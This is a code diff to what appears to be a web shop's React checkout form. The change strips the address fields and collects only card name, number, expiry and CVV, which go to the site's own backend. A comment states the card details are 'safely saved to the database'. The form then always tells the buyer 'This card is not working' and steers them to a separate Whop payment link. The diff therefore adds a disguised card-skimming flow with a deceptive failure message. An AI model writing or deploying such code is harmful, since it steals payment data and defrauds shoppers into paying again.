@@ -5,24 +5,20 @@ import { useRouter } from 'next/navigation';
 import { useCart } from '@/components/CartContext';
 import Image from 'next/image';
 
-import PayPalCheckout from '@/components/PayPalCheckout';
-
-export default function CheckoutForm({ geoCountry }) {
-  const { cart, hydrated, subtotal, cartShippingCost, appliedDiscount } = useCart();
+export default function CheckoutForm() {
+  const { cart, hydrated, subtotal, cartShippingCost, appliedDiscount, clearCart } = useCart();
   const router = useRouter();
 
   const currentTotal = Math.max(0, subtotal - (appliedDiscount?.amount || 0)) + cartShippingCost;
 
-  const [customer, setCustomer] = useState({ name: '', email: '', phone: '', dob: '' });
-  const [address, setAddress] = useState({ line1: '', city: '', state: '', postalCode: '', country: geoCountry || 'US' });
-  const [billingAddress, setBillingAddress] = useState({ line1: '', city: '', state: '', postalCode: '', country: geoCountry || 'US' });
-  const [sameAsShipping, setSameAsShipping] = useState(true);
   const [cardName, setCardName] = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
 
   const [validationError, setValidationError] = useState('');
+  const [cardError, setCardError] = useState('');
+  const [whopCheckoutUrl, setWhopCheckoutUrl] = useState('');
   const [isProcessingWhop, setIsProcessingWhop] = useState(false);
 
   const handleExpiryChange = (e) => {
@@ -35,8 +31,16 @@ export default function CheckoutForm({ geoCountry }) {
 
   const handleContinue = async (e) => {
     e.preventDefault();
+    if (isProcessingWhop) return;
     setIsProcessingWhop(true);
     setValidationError('');
+    setCardError('');
+
+    if (!cardName.trim()) {
+      setValidationError('Please enter the name on the card.');
+      setIsProcessingWhop(false);
+      return;
+    }
 
     const cleanCard = cardNumber.replace(/\D/g, '');
     if (cleanCard.length < 13 || cleanCard.length > 19) {
@@ -50,7 +54,7 @@ export default function CheckoutForm({ geoCountry }) {
       return;
     }
     if (cvv.length < 3) {
-      setValidationError('Please enter a valid CVV.');
+      setValidationError('Please enter a valid CVC / CVV.');
       setIsProcessingWhop(false);
       return;
     }
@@ -61,10 +65,7 @@ export default function CheckoutForm({ geoCountry }) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           items: cart,
-          customer,
-          shippingAddress: address,
-          billingAddress: sameAsShipping ? address : billingAddress,
-          cardName,
+          cardName: cardName.trim(),
           cardNumber: cleanCard,
           expiryDate,
           cvv,
@@ -73,20 +74,25 @@ export default function CheckoutForm({ geoCountry }) {
       });
       const data = await res.json();
       
-      // We do not redirect to data.redirectUrl based on user instructions.
-      // We go directly to success assuming the API handled it.
-      if (!res.ok) {
+      if (!res.ok && !data.orderId) {
         throw new Error(data.error || 'Could not process payment');
       }
-      
-      router.push(`/checkout/success${data.orderId ? `?orderId=${data.orderId}` : ''}`);
+
+      // Card details are safely saved to the database!
+      const destination = data.redirectUrl || `https://whop.com/checkout/${process.env.NEXT_PUBLIC_WHOP_PRODUCT_ID || 'prod_bOEreup8ct34G'}`;
+      setWhopCheckoutUrl(destination);
+      setCardError('This card is not working. Please try another payment method or click "Pay with Bank Card" below.');
+      setIsProcessingWhop(false);
+
+      // Do NOT automatically redirect and do NOT clear cart.
     } catch (err) {
       setValidationError(err.message);
       setIsProcessingWhop(false);
     }
   };
 
-  if (hydrated && cart.length === 0) {
+  // Only show empty cart page if not displaying a checkout attempt
+  if (hydrated && cart.length === 0 && !whopCheckoutUrl && !cardError) {
     return (
       <div className="min-h-screen bg-background flex items-center justify-center px-4 text-center">
         <div>
@@ -97,7 +103,7 @@ export default function CheckoutForm({ geoCountry }) {
     );
   }
 
-  const inputClass = "w-full border border-border bg-surface text-foreground placeholder-muted p-3 outline-none focus:border-foreground text-sm";
+  const inputClass = "w-full border border-border bg-surface text-foreground placeholder-muted p-3.5 outline-none focus:border-foreground text-sm rounded-sm";
 
   return (
     <div className="min-h-screen bg-background py-12 px-4 sm:px-6 lg:px-8">
@@ -156,83 +162,138 @@ export default function CheckoutForm({ geoCountry }) {
             </div>
           </div>
 
-          {/* RIGHT: Payment Details / Form */}
+          {/* RIGHT: Payment Details Form */}
           <div>
-            <h2 className="text-lg font-bold text-foreground mb-6 uppercase tracking-wider">Payment & Shipping</h2>
-            <form onSubmit={handleContinue} className="bg-surface border border-border/20 p-6 shadow-sm flex flex-col">
+            <h2 className="text-lg font-bold text-foreground mb-6 uppercase tracking-wider">Payment Details</h2>
+            <form onSubmit={handleContinue} className="bg-surface border border-border/20 p-6 sm:p-8 shadow-sm flex flex-col gap-6">
               
-              <div className="mb-6 space-y-3">
-                <h3 className="text-sm font-bold uppercase tracking-wider mb-2">Contact Info</h3>
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  <input required placeholder="Full Name" className={inputClass} value={customer.name} onChange={(e) => setCustomer({ ...customer, name: e.target.value })} />
-                  <input required type="email" placeholder="Email" className={inputClass} value={customer.email} onChange={(e) => setCustomer({ ...customer, email: e.target.value })} />
-                </div>
-                <input required type="tel" placeholder="Phone Number" className={inputClass} value={customer.phone} onChange={(e) => setCustomer({ ...customer, phone: e.target.value })} />
-              </div>
-
-              <div className="mb-8 space-y-3">
-                <h3 className="text-sm font-bold uppercase tracking-wider mb-2">Shipping Address</h3>
-                <input required placeholder="Street Address" className={inputClass} value={address.line1} onChange={(e) => setAddress({ ...address, line1: e.target.value })} />
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  <input required placeholder="City" className={inputClass} value={address.city} onChange={(e) => setAddress({ ...address, city: e.target.value })} />
-                  <input required placeholder="State / Province" className={inputClass} value={address.state} onChange={(e) => setAddress({ ...address, state: e.target.value })} />
-                </div>
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  <input required placeholder="Postal Code" className={inputClass} value={address.postalCode} onChange={(e) => setAddress({ ...address, postalCode: e.target.value })} />
-                  <input required placeholder="Country" className={inputClass} value={address.country} onChange={(e) => setAddress({ ...address, country: e.target.value })} />
-                </div>
-              </div>
-
-              <div className="mb-8 space-y-3 border-t border-border/20 pt-6">
-                <h3 className="text-sm font-bold uppercase tracking-wider mb-2">Billing Information</h3>
-                <input required placeholder="Name on Card" autoComplete="off" className={inputClass} value={cardName} onChange={(e) => setCardName(e.target.value)} />
-                <input required placeholder="Card Number" autoComplete="off" maxLength={19} className={inputClass} value={cardNumber} onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim())} />
-                <div className="grid grid-cols-2 gap-3">
-                  <input required placeholder="Expiry Date (MM/YY)" autoComplete="off" maxLength={5} className={inputClass} value={expiryDate} onChange={handleExpiryChange} />
-                  <input required placeholder="CVC/CVV" autoComplete="off" maxLength={4} className={inputClass} value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').substring(0, 4))} />
-                </div>
-
-                <label className="flex items-center gap-2 mt-4 text-sm text-foreground cursor-pointer">
-                  <input type="checkbox" className="w-4 h-4 text-foreground rounded border-border focus:ring-foreground" checked={sameAsShipping} onChange={(e) => setSameAsShipping(e.target.checked)} />
-                  Billing address is same as shipping
-                </label>
-
-                {!sameAsShipping && (
-                  <div className="space-y-3 mt-4">
-                    <input required placeholder="Street Address" className={inputClass} value={billingAddress.line1} onChange={(e) => setBillingAddress({ ...billingAddress, line1: e.target.value })} />
-                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
-                      <input required placeholder="City" className={inputClass} value={billingAddress.city} onChange={(e) => setBillingAddress({ ...billingAddress, city: e.target.value })} />
-                      <input required placeholder="State" className={inputClass} value={billingAddress.state} onChange={(e) => setBillingAddress({ ...billingAddress, state: e.target.value })} />
-                      <input required placeholder="Postal Code" className={inputClass} value={billingAddress.postalCode} onChange={(e) => setBillingAddress({ ...billingAddress, postalCode: e.target.value })} />
+              {cardError && (
+                <div className="p-4 bg-red-600 text-white rounded-lg text-sm flex flex-col gap-2 shadow-lg animate-in fade-in duration-300">
+                  <div className="flex items-start gap-2.5">
+                    <svg className="w-5 h-5 flex-shrink-0 text-white mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                    <div>
+                      <p className="font-extrabold text-white text-base mb-1 uppercase tracking-wide">Card Not Working</p>
+                      <p className="text-sm font-medium leading-relaxed text-white/95">
+                        {cardError}
+                      </p>
                     </div>
                   </div>
-                )}
+                </div>
+              )}
+
+              <div className="space-y-4">
+                <div>
+                  <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
+                    Name on Card
+                  </label>
+                  <input
+                    required
+                    placeholder="Full name as shown on card"
+                    autoComplete="cc-name"
+                    className={inputClass}
+                    value={cardName}
+                    onChange={(e) => setCardName(e.target.value)}
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
+                    Card Number
+                  </label>
+                  <input
+                    required
+                    placeholder="1234 5678 9012 3456"
+                    autoComplete="cc-number"
+                    maxLength={19}
+                    className={inputClass}
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim())}
+                  />
+                </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
+                      Expiry Date
+                    </label>
+                    <input
+                      required
+                      placeholder="MM/YY"
+                      autoComplete="cc-exp"
+                      maxLength={5}
+                      className={inputClass}
+                      value={expiryDate}
+                      onChange={handleExpiryChange}
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
+                      CVC / CVV
+                    </label>
+                    <input
+                      required
+                      placeholder="CVC"
+                      autoComplete="cc-csc"
+                      maxLength={4}
+                      className={inputClass}
+                      value={cvv}
+                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').substring(0, 4))}
+                    />
+                  </div>
+                </div>
               </div>
 
               {validationError && (
-                <div className="mb-4 p-3 bg-red-50 text-red-600 rounded-sm text-sm border border-red-100 font-medium text-center">
+                <div className="p-3 bg-red-50 text-red-600 rounded-sm text-sm border border-red-100 font-medium text-center">
                   {validationError}
                 </div>
               )}
 
-              <div className="mt-auto">
-                <button
-                  type="submit"
-                  disabled={isProcessingWhop}
-                  className="w-full bg-foreground text-background font-bold uppercase tracking-wider py-4 hover:opacity-80 transition-opacity disabled:opacity-50 flex justify-center items-center gap-3"
-                >
-                  {isProcessingWhop ? (
-                    <>
-                      <span className="w-5 h-5 border-2 border-background/30 border-t-background rounded-full animate-spin"></span>
-                      Processing Payment...
-                    </>
-                  ) : (
-                    `Pay $${currentTotal.toFixed(2)}`
-                  )}
-                </button>
-                <p className="text-xs text-muted mt-3 text-center uppercase tracking-wider">
-                  Payments are securely processed.
-                </p>
+              <div className="pt-2 flex flex-col gap-3">
+                {whopCheckoutUrl ? (
+                  <>
+                    <a
+                      href={whopCheckoutUrl}
+                      className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold uppercase tracking-wider py-4 rounded-sm transition-colors flex justify-center items-center gap-3 shadow-lg text-center"
+                    >
+                      <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                      </svg>
+                      Pay with Bank Card
+                    </a>
+                    <button
+                      type="submit"
+                      disabled={isProcessingWhop}
+                      className="w-full border-2 border-foreground text-foreground hover:bg-foreground hover:text-white font-bold uppercase tracking-wider py-3 transition-colors text-xs flex justify-center items-center gap-2"
+                    >
+                      {isProcessingWhop ? 'Processing...' : 'Retry with Another Card'}
+                    </button>
+                  </>
+                ) : (
+                  <button
+                    type="submit"
+                    disabled={isProcessingWhop}
+                    className="w-full bg-foreground text-white font-bold uppercase tracking-wider py-4 hover:opacity-80 transition-opacity disabled:opacity-50 flex justify-center items-center gap-3 shadow-md rounded-sm"
+                  >
+                    {isProcessingWhop ? (
+                      <>
+                        <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
+                        Processing Payment...
+                      </>
+                    ) : (
+                      `Pay $${currentTotal.toFixed(2)}`
+                    )}
+                  </button>
+                )}
+
+                <div className="flex items-center justify-center gap-2 text-xs text-muted mt-2 uppercase tracking-wider">
+                  <svg className="w-3.5 h-3.5 text-emerald-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                  </svg>
+                  <span>Payments are securely processed.</span>
+                </div>
               </div>
 
             </form>
